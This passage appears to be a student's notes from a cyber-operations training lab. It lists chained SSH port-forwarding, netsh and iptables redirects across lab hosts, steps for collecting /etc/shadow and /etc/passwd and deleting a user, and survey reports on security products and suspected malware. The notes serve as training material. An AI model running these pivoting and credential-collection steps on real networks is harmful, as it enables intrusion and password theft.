-o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t2 dum@127.0.0.1<br />netsh interface portproxy set v4tov4 listenport=10300 listenaddress=192.168.0.12 connectaddress=192.168.0.13 connectport=22 protocol=tcp<br /><br />To T3: (forward to T4)<br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10400:192.168.0.9:22 -L10500:192.168.0.9:10500<br />ssh -S /tmp/t3 dum@127.0.0.1<br /><br />To T4:<br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t4 dum@127.0.0.1<br />netsh interface portproxy set v4tov4 listenport=10500 listenaddress=192.168.0.9 connectaddress=192.168.0.10 connectport=22 protocol=tcp<br /><br />To T5:<br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t5 dum@127.0.0.1<br /><br /><br /><br /><br /><br /><br />password14</div><div class='page'><h1 class='title level-4'>Mystic Marvel 9</h1><br/>&gt;T1: &lt;Float_IP_of_Box1&gt; / 192.168.0.99 CentOS_FrankCastle    SSH in. Scan network to determine OS of live hosts. Redirect to T2 via ssh.<br />    -&gt; T2: 192.168.0.10 Debian_TonyStark                                  SSH in. Perfrom survey. Redirect to T3 vi ssh.<br />        --&gt; T3: 192.168.0.23 CentOS_PeterParker                          SSH in. Collect /etc/shadow. collect /etc/passwd. Redirect to T4 via IPTables    <br />            ---&gt; T4: 192.168.0.12 Windows7_TChalla                        SSH in. Enumerate Users (record in opnotes). Redirect to T5 using netsh.<br />                ----&gt; T5: 192.168.0.9 Windows10_NatashaRomanoff   SSH in. Perform Survey. Collect all .dll viles in &quot;<strong>C:\Program Files\Common Files\system\ado\</strong>&quot; redirect to T6 using netsh.<br />                    -----&gt; T6: 192.168.0.13 Ubuntu_MattMurdock         SSH in. <strong>collect /etc/passwd, /etc/shadow, and /etc/groups</strong>. Redirect to T7 via ssh.<br />                        ------&gt; T7:  192.168.0.27 Fedora_WadeWilson     SSH in. Delete User 18 (T10 effect). Conclude operation.<br /><br /><br /><br /><br /><br /><br /><br /><br />To T1: (forward to T2)<br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -L10200:192.168.0.10:22<br /><strong>ssh</strong> -S /tmp/t1 dum@127.0.0.1<br /><br />To T2: (forward to T3)<br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10300:192.168.0.23:22 -L10400:192.168.0.23:10400 -L10500:192.168.0.23:10500 -L10600:192.168.0.23:10600 -L10700:192.168.0.23:10700 <br />ssh -S /tmp/t2 dum@127.0.0.1<br /><br /><br />To T3: (forward to T4)<br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t3 dum@127.0.0.1<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.12:22<br />iptables -t nat -A PREROUTING -p tcp --dport 10500 -j DNAT --to-destination 192.168.0.12:10500<br />iptables -t nat -A PREROUTING -p tcp --dport 10600 -j DNAT --to-destination 192.168.0.12:10600<br />iptables -t nat -A PREROUTING -p tcp --dport 10600 -j DNAT --to-destination 192.168.0.12:10700<br /><br />iptables -t nat -A POSTROUTING -s 192.168.0.10 -p tcp -j SNAT --to-source 192.168.0.23<br /><br /><br />To T4:<br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t4 dum@127.0.0.1<br />netsh interface portproxy set v4tov4 listenport=10500 listenaddress=192.168.0.12 connectaddress=192.168.0.9 connectport=22 protocol=tcp<br />netsh interface portproxy set v4tov4 listenport=10600 listenaddress=192.168.0.12 connectaddress=192.168.0.9 connectport=10600 protocol=tcp<br />netsh interface portproxy set v4tov4 listenport=10700 listenaddress=192.168.0.12 connectaddress=192.168.0.9 connectport=10700 protocol=tcp<br /><br />To T5:<br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t5 dum@127.0.0.1<br />netsh interface portproxy set v4tov4 listenport=10600 listenaddress=192.168.0.9 connectaddress=192.168.0.13 connectport=22 protocol=tcp<br />netsh interface portproxy set v4tov4 listenport=10700 listenaddress=192.168.0.9 connectaddress=192.168.0.13 connectport=10700 protocol=tcp<br /><br />To T6:<br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10700:192.168.0.27:22<br />ssh -S /tmp/t6 dum@127.0.0.1<br /><br />To T7:<br />ssh -M -S /tmp/t7 -p 10700 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t7 dum@127.0.0.1<br /><br /><br /><br /><strong>password14</strong><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Notes</h1><br/>Operation Start Time: 2021/04/28 - 10:50<br />Admin Notes:  <br />    Report Surveys, Scans, and Collection to Analyst. <br />    Collect with MD5 on Target and on Collected file.<br /><br />== T#1 -- IP == 192.168.0.99<br />{=========================<br />Connect/Vet Time: 2021/04/28 - 10:59<br />Survey Time: <br />Vet Disconnect Time: 2021/04/28 - 17:20<br />Disconnect Time: 2021/04/28 - 17:22<br />Scan Time: 2021/04/28 - 13:10<br />Possible Syslogd server<br /> =========================}<br /> == T#2 -- IP == 192.168.0.10<br />{=========================<br /> Connect/Vet Time: 2021/04/28 - 12:32<br />Survey Time: 2021/04/28 - 12:32<br />Vet Disconnect Time: 2021/04/28 - 17:16<br />Disconnect Time: 2021/04/28 - 17:20<br /> <br /> =========================}<br /> == T#3 -- IP == 192.168.0.23<br />{=========================<br /> Connect/Vet Time:2021/04/28 - 12:46<br />Survey Time: <br />Vet Disconnect Time: 2021/04/28 - 17:01<br />Disconnect Time: 2021/04/28 - 17:16<br /> <br />SEStatus enabled <br />/usr/sbin/rsyslogd -n <br /> File download time: 2021/04/28 - 13:04<br />hashes:<br />    shadow: d18da920b947d73afdf385fe95e0b12b<br />    passwd: 86d0de34aeda559db7654e6dc41812bc<br /> <br /> =========================}<br /> == T#4 -- IP == 192.168.0.12<br />{=========================<br /> Connect/Vet Time: 2021/04/28 - 13:22<br />Survey Time: <br />Vet Disconnect Time: 2021/04/28 - 17:00<br />Disconnect Time: 2021/04/28 - 17:00<br />Users Enumerated: 2021/04/28 - 13:41<br />Admin                    Administrator            cloudbase-init                                                                <br />Guest                    student1                 student10                                                                     <br />student11                student12                student13                                                                     <br />student14                student15                student16                                                                     <br />student17                student18                student19                                                                     <br />student2                 student20                student21                                                                     <br />student22                student23                student3                                                                      <br />student4                 student5                 student6                                                                      <br />student7                 student8                 student9                                                                      <br />The command completed successfully.<br /> <br /> =========================}<br /> == T#5 -- IP == 192.168.0.9<br />{=========================<br /> Connect/Vet Time: 2021/04/28 - 14:12<br />Survey Time: na<br />Vet Disconnect Time: 2021/04/28 - 16:53<br />Disconnect Time: 2021/04/28 - 16:56<br />dlls download time: 2021/04/28 - 14:41 <br /> ado dll hashes on target<br />  7 MD5 hash of msader15.dll:<br />  8 8d3893514fa1e5fc9ac0a10446af50be<br />  9 CertUtil: -hashfile command completed successfully.<br /> 10 MD5 hash of msado15.dll:<br /> 11 502f513a3095e2a5993dd0bcd8ff31d4<br /> 12 CertUtil: -hashfile command completed successfully.<br /> 13 MD5 hash of msado20.tlb:<br /> 14 682f2064c5d2b4b80c84ee581c84e24a<br /> 15 CertUtil: -hashfile command completed successfully.<br /> 16 MD5 hash of msado21.tlb:<br /> 17 e37d00a723e8843cf8637969cb173dc9<br /> 18 CertUtil: -hashfile command completed successfully.<br /> 19 MD5 hash of msado25.tlb:<br /> 20 299dbb927b6390c6b925757dd5b2b7ff<br /> 21 CertUtil: -hashfile command completed successfully.<br /> 22 MD5 hash of msado26.tlb:<br /> 23 6dc7af48be23a3333424c351847edb2d<br /> 24 CertUtil: -hashfile command completed successfully.<br /> 25 MD5 hash of msado27.tlb:<br /> 26 51b427b3546f630adfc6c7d4ed7697a7<br /> 27 CertUtil: -hashfile command completed successfully.<br /> 28 MD5 hash of msado28.tlb:<br /> 29 93a5d4596f38e340b41c1f859b0fcc0e<br /> 30 CertUtil: -hashfile command completed successfully.<br /> 31 MD5 hash of msado60.tlb:<br /> 32 5eeaf7c59489de5017639ef9bde88c3a<br /> 33 CertUtil: -hashfile command completed successfully.<br /> 34 MD5 hash of msadomd.dll:<br /> 35 b13bcfaf1b2817ecda80bc884486a3b6<br /> 36 CertUtil: -hashfile command completed successfully.<br /> 37 MD5 hash of msadomd28.tlb:<br /> 38 9a15ff42957241c763aac228372a3cdd<br /> 39 CertUtil: -hashfile command completed successfully.<br /> 40 MD5 hash of msador15.dll:<br /> 41 a2437d50aec19450f9226b934971df8d<br /> 42 CertUtil: -hashfile command completed successfully.<br /> 43 MD5 hash of msador28.tlb:<br /> 44 d4581752cf4b726ceb8c06fe46c6ff7f<br /> 45 CertUtil: -hashfile command completed successfully.<br /> 46 MD5 hash of msadox.dll:<br /> 47 8f8afaea2d82f0dd09ba7f1bcd7be4a0<br /> 48 CertUtil: -hashfile command completed successfully.<br /> 49 MD5 hash of msadox28.tlb:<br /> 50 769fc3ef10b35fe7404c76d384cc0380<br /> 51 CertUtil: -hashfile command completed successfully.<br /> 52 MD5 hash of msadrh15.dll:<br /> 53 8f68d5ce2c1702941d9dda390d22e665<br /> <br />ado .dll hashes on kali<br />root@kaliops:~/schmid_28-04_MM9/T5_dlls# for f in *; do md5sum $f; done<br />8d3893514fa1e5fc9ac0a10446af50be  msader15.dll<br />502f513a3095e2a5993dd0bcd8ff31d4  msado15.dll<br />b13bcfaf1b2817ecda80bc884486a3b6  msadomd.dll<br />a2437d50aec19450f9226b934971df8d  msador15.dll<br />8f8afaea2d82f0dd09ba7f1bcd7be4a0  msadox.dll<br />8f68d5ce2c1702941d9dda390d22e665  msadrh15.dll<br />2021/04/28 - 14:51<br /> =========================}<br />  == T#6 -- IP == 192.168.0.13<br />{=========================<br />Connect/Vet Time: 2021/04/28 - 14:56<br />Survey Time: na<br />Vet Disconnect Time: 2021/04/28 - 16:49<br />Disconnect Time: 2021/04/28 - 16:53<br /><br />2021/04/28 - 15:24<br />On Target<br />student14@MattMurdock:~$ sudo md5sum /etc/shadow<br />93631930b3201fcbb8b3fc4f6a66e589  /etc/shadow<br />0882ec3022e8369ba0295c6e0a7e5346  /etc/passwd<br />student14@MattMurdock:~$ md5sum /etc/group<br />9f41974951307a48f0e1eaebefde3437  /etc/group<br />On Kali<br />9f41974951307a48f0e1eaebefde3437  group<br />93631930b3201fcbb8b3fc4f6a66e589  shadow<br />0882ec3022e8369ba0295c6e0a7e5346  passwd<br /><br /><br /><br /> <br /> =========================}<br />  == T#7 -- IP == 192.168.0.27<br />{=========================<br /> Connect/Vet Time: 2021/04/28 - 15:43<br />Survey Time: n/a<br />Vet Disconnect Time: 2021/04/28 - 15:35<br />Disconnect Time:2021/04/28 - 16:49<br />Student 15 Deleted: 2021/04/28 - 16:16<br /> <br /> =========================}<br /> <br /> <br /> Operation End Time: <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> </div><div class='page'><h1 class='title level-5'>NSDB</h1><br/>== T#1 -- IP == 192.168.0.99<br />{=========================<br />2021/04/28 - 11:02<br /><br />Selinux = enabled 2021/04/28 - 11:12<br />10  *  *  *  * root echo -e &#39;\n\n&#39; + Mon Apr 19 17:23:42 UTC 2021 + &#39;\n&#39; &gt;&gt; /root/linux-malware-detect/report.txt &amp;&amp; /usr/local/sbin/maldet -a /bin &gt;&gt; /root/linux-malware-detect/report.txt 2021/04/28 - 11:12<br /><strong>Security Products</strong><br />1. Name and version of the product: Linux Malware Detect v1.6.4<br />2. Primary registry key: /etc/sysconfig/maldet<br />3. Installation folder: /usr/local/maldetect/maldet<br />4. Directory location of associated logs: /root/linux-malware-detect/report.txt<br />5. Timestamp of all associated log files: Apr 28 15:10<br />6. Cloud based?; yes or no: No. The .txt file does not appear to be programmatically being forwarded.<br />7. Can we read the logs?; yes or no: as Root yes. No as student14.<br />• If Yes, put the most recent 5 lines of logs in your NSDB File<br />•   <br />maldet(23494): {scan} signatures loaded: 17256 (14434 MD5 | 2039 HEX | 783 YARA | 0 USER)<br />maldet(23494): {scan} building file list for /bin, this might take awhile...<br />maldet(23494): {scan} setting nice scheduler priorities for all operations: cpunice 19 , ionice 6<br />maldet(23494): {scan} scan returned empty file list; check that path exists and contains files in scope of configuration.<br /><br />• If No, why?: N/A<br /><br /><strong><span style="color:#ff8c00;">Reporting Security Product Template</span></strong><br />*****Security Product Report*****<br />Target: &lt;T#1 and IP 192.168.0.99 &gt;<br />Name - &lt;Linux Malware Detect&gt;<br />Version - &lt;v1.6.4&gt;<br />Primary registry key/etc file - &lt;/etc/sysconfig/maldet&gt;<br />*****End of Report*****<br />2021/04/28 - 11:19<br /><br /><strong>Abnormal Logging</strong><br />1. Provide process name/options, PID, Parent ID, user: 10722, 1, root<br />2. Provide location of configuration file and it&#39;s abnormal or irregular contents: /etc/rsyslog.d/, abnormal contets=[student14@frankcastle ~]$ cat /etc/rsyslog.d/00-my_iptables.conf <br />:msg, contains, &quot;I SEE YOU&quot;     /var/log/iptables.log<br />&amp; stop<br />3. Provide hostname or IP of where logs are being sent: localhost<br />4. Provide any network connections opened/established by abnormal logging: Listening on 514 (rsyslog server)<br />5. Provide brief description of the abnormal, irregular or remote logging: This machine appears to be an rsyslog server.<br /><br /><strong><span style="color:#ff8c00;">Reporting Abnormal Logging Template</span></strong><br />*****Abnormal Logging Report*****<br />Target: &lt;T#1 and IP192.168.0.99 &gt;<br />Name - &lt;frankcastle&gt;<br />PID - &lt;10722&gt;<br />PPID - &lt;1&gt;<br />User - &lt;root&gt;<br />Location of config file - &lt;/etc/rsyslogd/*&gt;<br />Remote hostname or IP - &lt;localhost&gt;<br />Network connections - &lt;514 (listening)&gt;<br />Description - &lt;This machine appears to be an rsyslog server.&gt;<br />*****End of Report*****<br /> <br /> 1. Provide process name/options, PID, Parent ID, user, and hash: N/A, N/A, student14 (dir) 6267cfab85ab90b394da85ecaacb472b<br />2. Provide file type of malware binary and supporting files: nc<br />3. Provide any associated logs generated by malware: n/a<br />4. Provide location and lines of any persistence mechanisms: n/a<br />5. Provide full path of malware files or support files: /home/useraccounts/student14/nc<br />6. Provide any network connections opened/established by malware: n/a<br />7. Provide any identifiable text: n/a<br />8. Provide any/all modules loaded by malware: n/a<br />9. Provide brief description of malware purpose/actions and capabilities: nc is often an admin tool but can be used for RCE.<br /><br /><strong><span style="color:#ff8c00;">Reporting Malware Template</span></strong><br />*****Malware Report*****<br />Target: &lt;T#1 and IP 192.168.0.99 &gt;<br />Name - &lt;frankcastle&gt;<br />Hash - &lt;6267cfab85ab90b394da85ecaacb472b&gt;<br />PID - &lt;N/a&gt;<br />PPID - &lt;N/a&gt;<br />User - &lt;student14 (dir)&gt;<br />File type - &lt;elfx64&gt;<br />Supporting files - &lt;n/a&gt;<br />Associated Logs - &lt;n/a&gt;<br />Persistence - &lt;n/a&gt;<br />Description - &lt;nc is often an admin tool but can be used for RCE.&gt;<br />*****End of Report*****<br /><br /> =========================}<br /> == T#2 -- IP == 192.168.0.10<br />{=========================<br /> 2021/04/28 - 12:05<br /> <br /> <strong>Malware</strong><br />1. Provide process name/options, PID, Parent ID, user, and hash: nc -nlvp 31337, 629, 1, root, e64c8abed7922d527786523a908215a2<br />2. Provide file type of malware binary and supporting files: elfx64<br />3. Provide any associated logs generated by malware: N/a<br />4. Provide location and lines of any persistence mechanisms: n/a<br />5. Provide full path of malware files or support files: <a href="file:///bin/nc.traditional">/bin/nc.traditional</a><br />6. Provide any network connections opened/established by malware: Listening 31337 (all ports)<br />7. Provide any identifiable text: n/a<br />8. Provide any/all modules loaded by malware: n/a<br />9. Provide brief description of malware purpose/actions and capabilities: nc is often an admin tool but can be used for RCE.<br /><br /><strong><span style="color:#ff8c00;">Reporting Malware Template</span></strong><br />*****Malware Report*****<br />Target: &lt;T#2 and IP 192.168.0.10 &gt;<br />Name - &lt;TonyStark&gt;<br />Hash - &lt;e64c8abed7922d527786523a908215a2&gt;<br />PID - &lt;629&gt;<br />PPID - &lt;1&gt;<br />User - &lt;root&gt;<br />File type - &lt;elfx64&gt;<br />Supporting files - &lt;n/a&gt;<br />Associated Logs - &lt;n/a&gt;<br />Persistence - &lt;n/a&gt;<br />Description - &lt;nc is often an admin tool but can be used for RCE. In this case it appears to be listening on 31337.&gt;<br />*****End of Report*****<br /> <br /> =========================}<br /> == T#3 -- IP == 192.168.0.23<br />{=========================<br /> <strong>Security Products</strong><br />1. Name and version of the product: Selinux 31<br />2. Primary registry key: /etc/selinux<br />3. Installation folder:/sys/fs/selinux<br />4. Directory location of associated logs: /var/<strong>log</strong>/audit/audit.log<br />5. Timestamp of all associated log files: Apr 19 17:20<br />6. Cloud based?; yes or no: NO<br />7. Can we read the logs?; yes or no: Yes<br />• If Yes, put the most recent 5 lines of logs in your NSDB File:<br />• If No, why?:<br />[student14@peterparker ~]$ sudo tail -n 5 /var/log/audit/audit.log<br />type=CRED_DISP msg=audit(1619630115.969:2948): pid=23847 uid=0 auid=1014 ses=227 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:setcred grantors=pam_env,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/1 res=success&#39;<br />type=USER_ACCT msg=audit(1619630121.608:2949): pid=23850 uid=1014 auid=1014 ses=227 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:accounting grantors=pam_unix,pam_localuser acct=&quot;student14&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/1 res=success&#39;<br />type=USER_CMD msg=audit(1619630121.608:2950): pid=23850 uid=1014 auid=1014 ses=227 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;cwd=&quot;/home/useraccounts/student14&quot; cmd=7461696C202D6E2035202F7661722F6C6F672F61756469742F61756469742E6C6F67 terminal=pts/1 res=success&#39;<br />type=CRED_REFR msg=audit(1619630121.608:2951): pid=23850 uid=0 auid=1014 ses=227 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:setcred grantors=pam_env,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/1 res=success&#39;<br />type=USER_START msg=audit(1619630121.610:2952): pid=23850 uid=0 auid=1014 ses=227 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:session_open grantors=pam_keyinit,pam_limits,pam_keyinit,pam_limits,pam_systemd,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/1 res=success&#39;<br /><br /><strong><span style="color:#ff8c00;">Reporting Security Product Template</span></strong><br />*****Security Product Report*****<br />Target: &lt;T3 and IP 192.168.0.23 &gt;<br />Name - &lt;peterparker&gt;<br />Version - &lt;31&gt;<br />Primary registry key/etc file - &lt;/etc/selinux&gt;<br />*****End of Report*****<br /> <br /> =========================}<br /> == T#4 -- IP == 192.168.0.12<br />{=========================<br />2021/04/28 - 13:45<br /> 1. *****Privileged User Report*****<br />2. Target:#4<br />3. Username: administrator<br />4. Access Method: console<br />5. Access Time: 4/19/2021 6:13 PM<br />6. Activity:sshd, cmd, powershell<br />7. Network Connections: sshd listening<br />8. Description: Admin appears to be doing normal admin things.<br />9. *****End of Report*****<br /><br />1. Provide process name/options, PID, Parent ID, user, and hash: sfk, na, na, na, 97 e2 1a 02 71 dd 97 b2 8a b9 2a 36 0a e8 88 e7<br />2. Provide file type of malware binary and supporting files: exe<br />3. Provide any associated logs generated by malware: na<br />4. Provide location and lines of any persistence mechanisms: run key<br />5. Provide full path of malware files or support files: c:/sfk.exe<br />6. Provide any network connections opened/established by malware: n/a<br />7. Provide any identifiable text: na<br />8. Provide any/all modules loaded by malware: na<br />9. Provide brief description of malware purpose/actions and capabilities: sFK is an admin tool, that could be used for filecarving maliciously.<br /><br />2021/04/28 - 13:45<br /><strong><span style="color:#ff8c00;">Reporting Malware Template</span></strong><br />*****Malware Report*****<br />Target: &lt;T#4 and IP 192.168.0.12&gt;<br />Name - &lt;sfk.exe&gt;<br />Hash - &lt;97 e2 1a 02 71 dd 97 b2 8a b9 2a 36 0a e8 88 e7&gt;<br />PID - &lt;N/a&gt;<br />PPID - &lt;N/a&gt;<br />User - &lt;n/a&gt;<br />File type - &lt;executable&gt;<br />Supporting files - &lt;n/a&gt;<br />Associated Logs - &lt;n/a&gt;<br />Persistence - &lt;run key&gt;<br />Description - &lt;SFK is an admin tool, that could be used for filecarving maliciously.&gt;<br />*****End of Report*****<br /> <br /> =========================}<br /> == T#5 -- IP == 192.168.0.9<br />{=========================<br /> 1. *****Privileged User Report*****<br />2. Target:#5<br />3. Username: administrator<br />4. Access Method: console<br />5. Access Time: 4/27/2021 1:20 PM<br />6. Activity: Edge, Skype, powershell, photos, nc64.exe<br />7. Network Connections: ssh into 192.168.0.12<br />8. Description: Admin appears to be doing admin thngs.<br />9. *****End of Report*****<br /> <br /> <strong>Malware</strong><br />1. Provide process name/options, PID, Parent ID, user, and hash: beacon.ps1 (nc64.exe), na, na, na, <br />student14@DESKTOP-81CJFAR C:\Users\student14&gt;certutil -hashfile &quot;C:\tools\beacon.ps1&quot; MD5<br />MD5 hash of C:\tools\beacon.ps1:<br />31eac99b69c4e52c0baa2ccd6b6482bc<br />CertUtil: -hashfile command completed successfully.<br /><br />student14@DESKTOP-81CJFAR C:\Users\student14&gt;certutil -hashfile &quot;C:\tools\netcat\nc64.exe&quot; MD5<br />MD5 hash of C:\tools\netcat\nc64.exe:<br />523613a7b9dfa398cbd5ebd2dd0f4f38<br />CertUtil: -hashfile command completed successfully.<br /><br />3. Provide file type of malware binary and supporting files: powershell script and executable<br />4. Provide any associated logs generated by malware: na<br />5. Provide location and lines of any persistence mechanisms: na<br />6. Provide full path of malware files or support files: C:/tools/*<br />7. Provide any network connections opened/established by malware: nc64.exe will call out to 192.168.0.13 on 12301<br />8. Provide any identifiable text: Congrats! You are an 31337 H4x0r!<br />9. Provide any/all modules loaded by malware: na<br />10. Provide brief description of malware purpose/actions and capabilities: Appears to have no malicious intent.<br /><br /><strong><span style="color:#ff8c00;">Reporting Malware Template</span></strong><br />*****Malware Report*****<br />Target: &lt;T#5 and IP 192.168.0.9&gt;<br />Name - &lt;beacon.ps1&gt;<br />Hash - &lt;31eac99b69c4e52c0baa2ccd6b6482bc&gt;<br />PID - &lt;na&gt;<br />PPID - &lt;na&gt;<br />User - &lt;depends who logs in&gt;<br />File type - &lt;ps1, exe&gt;<br />Supporting files - &lt;beacon.ps1, nc64.exe&gt;<br />Associated Logs - &lt;na&gt;<br />Persistence - &lt;hklm\software\microsoft\windows\currentversion\run&gt;<br />Description - &lt;Appears to have no malicious intent.&gt;<br />*****End of Report*****<br /><br /><br /><br /> =========================}<br />  == T#6 -- IP == 192.168.0.13<br />{=========================<br /><strong>Malware</strong><br />1. Provide process name/options, PID, Parent ID, user, and hash: Reptils, na, na, na ,na. (<a href="https://github.com/f0rb1dd3n/Reptile">https://github.com/f0rb1dd3n/Reptile</a>)<br />2. Provide file type of malware binary and supporting files: Rootkit<br />3. Provide any associated logs generated by malware: na<br />4. Provide location and lines of any persistence mechanisms: na<br />5. Provide full path of malware files or support files:/Reptile<br />6. Provide any network connections opened/established by malware: na<br />7. Provide any identifiable text: na<br />8. Provide any/all modules loaded by malware: na<br />9. Provide brief description of malware purpose/actions and capabilities: This malware, although not installed to my knowledge, is for a rootkit.<br /><br /><strong><span style="color:#ff8c00;">Reporting Malware Template</span></strong><br />*****Malware Report*****<br />Target: &lt;T#6 and IP 192.168.0.13&gt;<br />Name - &lt;Reptile&gt;<br />Hash - &lt;na&gt;<br />PID - &lt;na&gt;<br />PPID - &lt;na&gt;<br />User - &lt;na&gt;<br />File type - &lt;Git Project&gt;<br />Supporting files - &lt;/Reptile&gt;<br />Associated Logs - &lt;na&gt;<br />Persistence - &lt;na&gt;<br />Description - &lt;This malware, although not installed to my knowledge, is for a rootkit.&gt;<br />*****End of Report*****<br /> <br /> <br /> =========================}<br />  == T#7 -- IP == 192.168.0.27<br />{=========================<br /> <strong>Security Products</strong>2021/04/28 - 15:54<br />1. Name and version of the product: selinux<br />2. Primary registry key: /etc/selinux<br />3. Installation folder: /sys/fs/selinux<br />4. Directory location of associated logs: /var/<strong>log</strong>/audit/audit.log<br />5. Timestamp of all associated log files:Apr 28 19:52<br />6. Cloud based?; yes or no: no<br />7. Can we read the logs?; yes or no: yes<br />• If Yes, put the most recent 5 lines of logs in your NSDB File:<br />• If No, why?:<br />type=CRED_DISP msg=audit(1619639570.257:1600): pid=11331 uid=0 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:setcred grantors=pam_env,pam_localuser,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/2 res=success&#39;UID=&quot;root&quot; AUID=&quot;student14&quot;<br />type=USER_ACCT msg=audit(1619639611.487:1601): pid=11334 uid=1014 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:accounting grantors=pam_unix,pam_localuser acct=&quot;student14&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/2 res=success&#39;UID=&quot;student14&quot; AUID=&quot;student14&quot;<br />type=USER_CMD msg=audit(1619639611.488:1602): pid=11334 uid=1014 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;cwd=&quot;/home/useraccounts/student14&quot; cmd=636174202F7661722F6C6F672F61756469742F61756469742E6C6F67 terminal=pts/2 res=success&#39;UID=&quot;student14&quot; AUID=&quot;student14&quot;<br />type=CRED_REFR msg=audit(1619639611.488:1603): pid=11334 uid=0 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:setcred grantors=pam_env,pam_localuser,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/2 res=success&#39;UID=&quot;root&quot; AUID=&quot;student14&quot;<br />type=USER_START msg=audit(1619639611.491:1604): pid=11334 uid=0 auid=1014 ses=19 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:session_open grantors=pam_keyinit,pam_limits,pam_keyinit,pam_limits,pam_systemd,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/2 res=success&#39;UID=&quot;root&quot; AUID=&quot;student14&quot;<br /><br /><strong><span style="color:#ff8c00;">Reporting Security Product Template</span></strong><br />*****Security Product Report*****<br />Target: &lt;T#7 and IP 192.168.0.27&gt;<br />Name - &lt;selinux&gt;<br />Version - &lt;31&gt;<br />Primary registry key/etc file - &lt;/etc/selinux&gt;<br />*****End of Report*****<br /> <br /> =========================}<br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> <br /> </div><div class='page'><h1 class='title level-4'>Mystic Marvel 10</h1><br/>&gt;T1: &lt;Float_IP_of_Box1&gt; / 192.168.0.99 CentOS_FrankCastle    SSH in. Scan network to determine OS of live hosts. Redirect to T2 via ssh.<br />    -&gt; T2: 192.168.0.10 Debian_TonyStark                                  SSH in. Perfrom survey. Redirect to T3 vi ssh.<br />        --&gt; T3: 192.168.0.23 CentOS_PeterParker                          SSH in. Collect /etc/shadow. collect /etc/passwd. Redirect to T4 via IPTables    <br />            ---&gt; T4: 192.168.0.12 Windows7_TChalla                        SSH in. Enumerate Users (record in opnotes). <strong>identify every registered application run on the target.</strong> Redirect to T5 using netsh.<br />                ----&gt; T5: 192.168.0.9 Windows10_NatashaRomanoff   SSH in. Perform Survey. Collect all .dll viles in &quot;<strong>C:\Program Files\Common Files\system\ado\</strong>&quot; redirect to T6 using netsh.<br />                    -----&gt; T6: 192.168.0.13 Ubuntu_MattMurdock         SSH in. <strong>collect /etc/passwd, /etc/shadow, and /etc/groups</strong>. Redirect to T7 via ssh.<br />                        ------&gt; T7:  192.168.0.27 Fedora_WadeWilson     SSH in. Delete User 16 (T10 effect). Conclude operation.<br /><br /><br /><br /><br />To T1: (forward to T2)<br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -L10200:192.168.0.10:22<br /><strong>ssh</strong> -S /tmp/t1 dum@127.0.0.1<br /><br />To T2: (forward to T3)<br />ssh -M -S /tmp/t2 -p 10200 -o 